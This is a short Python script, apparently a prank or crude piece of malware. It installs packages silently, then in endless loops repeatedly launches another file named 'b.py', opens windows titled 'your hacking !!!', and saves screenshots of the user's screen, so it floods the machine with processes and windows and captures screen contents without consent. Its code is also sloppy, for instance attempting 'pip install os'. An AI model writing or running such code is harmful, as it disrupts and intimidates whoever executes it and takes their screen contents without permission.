import os
from tkinter import *
from PIL import ImageGrab


os.system('pip install os')
os.system('pip install pillow')
os.system('pip install auto-py-to-exe')

def plus ():
    while True:
        os.startfile("b.py")
        window = Tk()
        window.title('your hacking !!!')
        window.minsize(900,800)
        window.maxsize(900,800)
        window.resizable(width=False,height=False)
        Button(window, text='No !!!').pack()



while True:
    os.startfile("b.py")
    os.system('auto-py-to-exe')
    window = Tk()
    window.title('your hacking !!!')
    window.minsize(900,800)
    window.maxsize(900,800)
    window.resizable(width=False,height=False)
    Button(window, text='your hacking !!!', command=plus).pack()
    sc = ImageGrab.grab()
    sc.save('your hacking!!!.png')
#    time.sleep(5)
